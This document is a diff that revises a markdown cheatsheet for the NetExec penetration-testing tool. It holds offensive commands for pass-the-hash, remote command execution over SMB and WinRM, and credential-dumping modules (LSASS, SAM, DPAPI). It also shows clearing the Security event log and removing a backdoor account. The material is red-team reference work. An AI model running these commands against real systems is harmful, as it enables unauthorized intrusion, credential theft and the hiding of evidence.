@@ -1,19 +1,7 @@
-# NetExec (Fork of CrackMapExec)
+# NetExec
 
 !!! tip "NetExec replaces CrackMapExec"
     NetExec (`nxc`) is the actively maintained fork of CrackMapExec (`cme`). Commands are near-identical — just replace `cme` with `nxc`. Use `nxc` on new installs; `cme` still works but is no longer maintained.
-
----
-## Installing NetExec
-
-```bash
-git clone https://github.com/Pennyw0rth/NetExec
-cd NetExec
-pip3 install -r requirements.txt
-python3 setup.py install
-```
-
-> Optional: Set up a Python virtualenv to isolate dependencies.
 
 ---
 ## Core Syntax
@@ -22,7 +10,7 @@ python3 setup.py install
 nxc <protocol> <target(s)> [flags]
 ```
 
-### Protocols:
+### Protocols
 
 - `smb` – Server Message Block (Windows file shares)
 - `winrm` – Remote Windows PowerShell
@@ -33,12 +21,11 @@ nxc <protocol> <target(s)> [flags]
 ---
 ## Authentication Methods
 
-|Method|Syntax Example|
+| Method | Syntax Example |
 |---|---|
-|Plaintext|`-u user -p pass`|
-|Hashes (PTH)|`-u user -H aad3...:hash`|
-|Kerberos|`-k -d domain.local` (Requires `KRB5CCNAME` or ticket)|
-|AAD/SSPI (not yet supported)|Work in progress (use other tools)|
+| Plaintext | `-u user -p pass` |
+| Hashes (PTH) | `-u user -H aad3...:hash` |
+| Kerberos | `-k -d domain.local` (Requires `KRB5CCNAME` or ticket) |
 
 ---
 ## SMB Examples
@@ -67,13 +54,13 @@ nxc smb 10.10.10.10 -u alice -p Winter2020! --shares
 ### Download File
 
 ```bash
-nxc smb 10.10.10.10 -u user -p pass --exec "get \\10.10.10.10\C$\Users\Public\loot.txt loot.txt"
+nxc smb 10.10.10.10 -u <user> -p <pass> --exec "get \\10.10.10.10\C$\Users\Public\loot.txt loot.txt"
 ```
 
 ### Upload File
 
 ```bash
-nxc smb 10.10.10.10 -u user -p pass --exec "put local.exe \\10.10.10.10\C$\Temp\local.exe"
+nxc smb 10.10.10.10 -u <user> -p <pass> --exec "put local.exe \\10.10.10.10\C$\Temp\local.exe"
 ```
 
 ---
@@ -85,7 +72,7 @@ nxc smb 10.10.10.10 -u user -p pass --exec "put local.exe \\10.10.10.10\C$\Temp\
 nxc smb 10.10.10.10 -u admin -p 'Passw0rd!' -d DOMAIN --exec 'cmd.exe /c whoami'
 ```
 
-> Requires `admin` access (impersonates via `svcctl`, `wmi`, etc. internally)
+> Requires admin access.
 
 ### Over WinRM (PowerShell)
 
@@ -100,94 +87,57 @@ nxc winrm 10.10.10.10 -u admin -p 'Passw0rd!' -d domain --exec 'whoami'
 nxc smb 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:ccb749a1e26e51b6e07ed92d6d68f762 -d domain --exec 'hostname'
 ```
 
-_Why it works:_ Uses NTLMv1/v2 authentication to bypass password requirement.
-
 ---
 ## Kerberos Authentication (TGT-based)
 
-1. Request TGT with `impacket-getTGT`
-    
-
 ```bash
 impacket-getTGT domain/user:password
-```
-
-2. Export ccache:
-    
-
-```bash
 export KRB5CCNAME=/path/to/krb5cc_domain
-```
-
-3. Run NetExec with `--kerberos`
-    
-
-```bash
 nxc smb 10.10.10.10 -k -d domain.local --exec 'whoami'
 ```
 
-> Use this for **OPSEC-safe access** when you already have a valid ticket.
+> Use for OPSEC-safe access when you already have a valid ticket.
 
 ---
 ## AD Enumeration via LDAP
 
 ```bash
 nxc ldap 10.10.10.10 -u user -p pass -d domain.local --users
-```
-
-```bash
 nxc ldap 10.10.10.10 -u user -p pass -d domain.local --groups
 ```
 
-Other LDAP options:
-
-- `--computers`
-    
-- `--password-policy`
-    
-- `--domain-controllers`
-    
-- `--loggedon-users`
-    
+Other LDAP options: `--computers`, `--password-policy`, `--domain-controllers`, `--loggedon-users`
 
 ---
 ## Modules You Should Know
 
 ```bash
-nxc smb <target> -u user -p pass -d domain --modules
+nxc smb 10.10.10.10 -u user -p pass -d domain --modules
 ```
 
-Common useful modules:
-
 - `lsassy`: Extracts LSASS credentials via SeDebugPrivilege
-    
 - `wmi`: Executes WMI queries
-    
 - `psremote`: Executes PowerShell scripts remotely
-    
 - `samdump`: Dumps local SAM hashes
-    
 - `dpapi`: Attempts DPAPI blob extraction
-    
 - `credz`: Parses saved credentials
-    
 
 ---
 ## Cleanup (Post-Exploitation Hygiene)
 
-Remove artifacts like payloads or logs:
+Remove artifacts:
 
 ```bash
 nxc smb 10.0.0.12 -u user -p pass --exec "del C:\Temp\rev.exe"
 ```
 
-Clear Windows Event Logs if needed (⚠️ noisy, only do if absolutely necessary):
+Clear Windows Event Logs (noisy — only if absolutely necessary):
 
 ```bash
 nxc winrm 10.0.0.12 -u user -p pass -d domain --exec 'wevtutil cl Security'
 ```
 
-Logoff/Disable the backdoor account if you created one:
+Delete a backdoor account:
 
 ```bash
 nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'
@@ -196,20 +146,19 @@ nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'
 ---
 ## NetExec Cheatsheet
 
-| Task                         | Command Example                                         |
-| ---------------------------- | ------------------------------------------------------- |
-| Check credentials (SMB)      | `nxc smb $IP -u user -p pass`                           |
-| Enumerate shares             | `nxc smb $IP -u user -p pass --shares`                  |
-| List domain users/groups     | `nxc ldap $IP -u user -p pass --users / --groups`       |
-| PTH authentication           | `nxc smb $IP -u user -H LM:NT`                          |
-| Kerberos authentication      | `nxc smb -k -d domain.local`                            |
-| Execute command (SMB)        | `nxc smb $IP -u admin -p pass --exec 'whoami'`          |
-| WinRM command execution      | `nxc winrm $IP -u admin -p pass --exec 'hostname'`      |
-| Upload file                  | `nxc smb $IP --exec 'put local.exe \\C$\Temp\back.exe'` |
-| Download file                | `nxc smb $IP --exec 'get \\C$\Temp\loot.txt local.txt'` |
-| Pivot with ProxyChains       | `proxychains nxc smb $IP ...`                           |
-| Enumerate AD password policy | `nxc ldap $IP -u user -p pass --password-policy`        |
-|                              |                                                         |
+| Task | Command Example |
+| --- | --- |
+| Check credentials (SMB) | `nxc smb 10.10.10.10 -u user -p pass` |
+| Enumerate shares | `nxc smb 10.10.10.10 -u user -p pass --shares` |
+| List domain users/groups | `nxc ldap 10.10.10.10 -u user -p pass --users / --groups` |
+| PTH authentication | `nxc smb 10.10.10.10 -u user -H LM:NT` |
+| Kerberos authentication | `nxc smb -k -d domain.local` |
+| Execute command (SMB) | `nxc smb 10.10.10.10 -u admin -p pass --exec 'whoami'` |
+| WinRM command execution | `nxc winrm 10.10.10.10 -u admin -p pass --exec 'hostname'` |
+| Upload file | `nxc smb 10.10.10.10 --exec 'put local.exe \\C$\Temp\back.exe'` |
+| Download file | `nxc smb 10.10.10.10 --exec 'get \\C$\Temp\loot.txt local.txt'` |
+| Pivot with ProxyChains | `proxychains nxc smb 10.10.10.10 ...` |
+| Enumerate AD password policy | `nxc ldap 10.10.10.10 -u user -p pass --password-policy` |
 
 ---
 ## Recommended Operator Workflow
@@ -232,4 +181,4 @@ nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'
 [7] Cleanup (remove binaries/logs)
 ```
 
-> _Pro Tip:_ After first access, start a BloodHound collection or dump tokens for delegation/impersonation.
+> After first access, start a BloodHound collection or dump tokens for delegation/impersonation.
